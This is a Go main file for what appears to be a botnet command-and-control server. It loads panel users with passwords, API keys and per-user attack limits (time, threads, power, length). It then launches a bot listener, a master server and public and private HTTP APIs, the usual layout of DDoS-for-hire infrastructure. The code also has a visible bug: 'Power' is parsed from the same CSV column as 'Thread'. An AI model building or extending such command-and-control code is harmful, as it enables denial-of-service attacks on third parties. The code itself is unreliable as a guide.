package main

import (
	"cnc/lib/api"
	"fmt"
	"strconv"
	"strings"

	//"cnc/lib/grafana"
	"cnc/lib/socket"
	"cnc/lib/utils"
)

func LoadUsers() {
	lines, err := utils.ReadLines("data/users.csv")
	if utils.HandleError(err) {
		panic(err)
	}

	for _, line := range lines {
		items := strings.Split(line, ",")

		ti, _ := strconv.Atoi(items[3])
		th, _ := strconv.Atoi(items[4])
		po, _ := strconv.Atoi(items[4])
		le, _ := strconv.Atoi(items[5])

		utils.Users = append(utils.Users, utils.User{
			Username: items[0],
			Password: items[1],
			ApiKey:   items[2],
			Time:     ti,
			Thread:   th,
			Power:    po,
			Length:   le,
		})
	}

	utils.Log(fmt.Sprintf("Loaded %d users", len(utils.Users)))
}

func main() {
	LoadUsers()

	go socket.StartBotServer()
	go socket.StartMasterServer()
	go api.ListenPrivateHttpServer()
	go api.ListenPublicHttpServer()
	//go grafana.StartPrometheus()

	select {}
}
